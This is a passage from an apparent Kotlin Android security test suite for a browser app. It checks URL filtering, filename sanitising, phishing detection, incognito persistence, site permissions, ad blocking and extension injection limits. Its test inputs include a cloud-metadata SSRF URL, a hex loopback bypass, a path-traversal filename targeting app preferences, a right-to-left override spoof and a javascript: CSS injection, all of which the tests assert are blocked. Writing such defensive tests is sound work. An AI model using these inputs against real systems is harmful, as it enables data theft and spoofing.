            com.example.manager.AppDownloadManager.isSafeDownloadUrl("http://169.254.169.254/latest/meta-data/", resolveDns = false)
        )
        assertFalse(
            "Hex/Octal loopback bypass must be blocked",
            com.example.manager.AppDownloadManager.isSafeDownloadUrl("http://0x7f000001/secret", resolveDns = false)
        )
        val traversalSanitized = com.example.manager.AppDownloadManager.sanitizeFileName("../../../../data/data/com.example/shared_prefs/prefs.xml")
        assertFalse("Sanitized filename must not contain path traversal", traversalSanitized.contains("/") || traversalSanitized.contains(".."))
        val rloSanitized = com.example.manager.AppDownloadManager.sanitizeFileName("statement_\u202Efdp.apk")
        assertFalse("Unicode RLO spoofing character must be stripped", rloSanitized.contains('\u202E'))

        // 3. DevTools & Bridge Payload Bounds + Threat Inspection Gate (Tahap 3)
        val threatResult = secGuard.inspectUrlThreat(
            url = "https://secure-login-verify.xyz/auth",
            httpsOnlyEnabled = true,
            phishingProtectionEnabled = true,
            isUserTrustedHost = false
        )
        assertNotEquals("Phishing URL must not be classified as SAFE", com.example.manager.ThreatSeverity.SAFE, threatResult.severity)

        // 4. Encrypted Preferences, Private Tab Isolation, & Incognito Download Isolation Gate (Tahap 4 & Tahap 5)
        val settings = com.example.manager.SettingsManager(context)
        settings.saveTabs(
            listOf(
                com.example.ui.viewmodel.BrowserTab(id = "norm_t8", url = "https://example.com", title = "Example", isPrivate = false),
                com.example.ui.viewmodel.BrowserTab(id = "priv_t8", url = "https://secret.example", title = "Secret", isPrivate = true)
            ),
            activeTabId = "priv_t8"
        )
        val restoredTabs = settings.loadTabs()
        assertNotNull(restoredTabs)
        assertEquals("Incognito tabs must never be persisted to disk", 1, restoredTabs!!.size)
        assertFalse(restoredTabs[0].isPrivate)
        assertEquals("norm_t8", restoredTabs[0].id)

        // 5. Permission Isolation, W3C Secure Context, & Ephemeral Host Bypass Reset Gate (Tahap 5 & Tahap 7)
        val permMgr = com.example.manager.PermissionManager(context)
        permMgr.setWebsitePermission(
            "https://media.example.com",
            com.example.manager.SitePermissionType.CAMERA,
            com.example.manager.PermissionState.ALLOW
        )
        assertEquals(
            com.example.manager.PermissionState.ALLOW,
            permMgr.getWebsitePermission("https://media.example.com", com.example.manager.SitePermissionType.CAMERA)
        )
        assertEquals(
            "HTTP origin on same host must not inherit HTTPS permission",
            com.example.manager.PermissionState.BLOCK,
            permMgr.getWebsitePermission("http://media.example.com", com.example.manager.SitePermissionType.CAMERA)
        )

        secGuard.allowHostTemporarily(context, "ephemeral-bypass-t8.example.com", persist = false)
        assertTrue(secGuard.isHostUserTrusted(context, "ephemeral-bypass-t8.example.com"))

        // Verify namespace isolation when clearing permissions & temporary bypasses
        val encPrefs = com.example.manager.EncryptedPreferencesManager.getPreferences(context)
        encPrefs.edit().putString("audit_sentinel_key_t8", "intact_value").commit()
        permMgr.clearAllPermissions()
        secGuard.clearTemporaryBypasses()

        assertEquals(
            "Site permission must reset to ASK after clearAllPermissions()",
            com.example.manager.PermissionState.ASK,
            permMgr.getWebsitePermission("https://media.example.com", com.example.manager.SitePermissionType.CAMERA)
        )
        assertFalse(
            "Temporary host bypass must be cleared after clearTemporaryBypasses()",
            secGuard.isHostUserTrusted(context, "ephemeral-bypass-t8.example.com")
        )
        assertEquals(
            "Global encrypted preference outside permission namespace must survive permission clear",
            "intact_value",
            encPrefs.getString("audit_sentinel_key_t8", "")
        )

        // 6. AdBlock, Tracker Blocking, Cosmetic Sanitizer, WebRTC, & Extension Security Gate (Tahap 6 & Tahap 7)
        val webView = WebView(context)
        val adBlockClient = AdBlockWebViewClient(PrivacyMode.BALANCED)
        adBlockClient.updateCurrentPageUrl("https://news.example.com")
        assertNotNull(
            "Known ad/tracker script must be intercepted in BALANCED mode",
            adBlockClient.shouldInterceptRequest(webView, createRequest("https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"))
        )
        assertFalse(
            "Malicious CSS selector attempting block breakout must be rejected",
            com.example.manager.CosmeticFilterInjector.isSafeCssSelector(".ad-slot { background: url(javascript:alert(1)) }")
        )

        val strictWebRtcJs = secGuard.buildWebRtcProtectionScript(preventWebRtcLeak = true, strictWebRtcMode = true)
        assertTrue(strictWebRtcJs.contains("RTCPeerConnection") && strictWebRtcJs.contains("webkitRTCPeerConnection"))

        val autoExt = com.example.manager.BrowserExtension(
            id = "ext_t8",
            name = "T8 Auto Ext",
            jsCode = "console.log('t8');",
            matches = listOf("*"),
            isEnabled = true
        )
        assertFalse(
            "Auto extension injection must be blocked on critical banking/auth domains",
            com.example.manager.BrowserExtensionManager.canAutoInjectExtensionOnUrl(autoExt, "https://accounts.google.com/ServiceLogin")
        )
    }
}

